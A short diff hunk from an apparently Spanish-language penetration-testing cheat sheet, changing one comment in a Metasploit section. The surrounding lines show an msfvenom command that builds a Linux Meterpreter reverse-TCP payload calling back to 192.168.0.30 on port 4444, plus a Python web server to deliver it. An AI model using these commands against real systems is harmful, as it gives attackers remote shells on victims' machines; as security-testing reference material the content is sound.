@@ -1238,7 +1238,7 @@ Metasploit - Meterpreter
 bash# Generar payload
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.30 LPORT=4444 -f elf > shell.elf
 
-# Servir payload
+# Server payload
 python3 -m http.server 8000
 
 # Listener
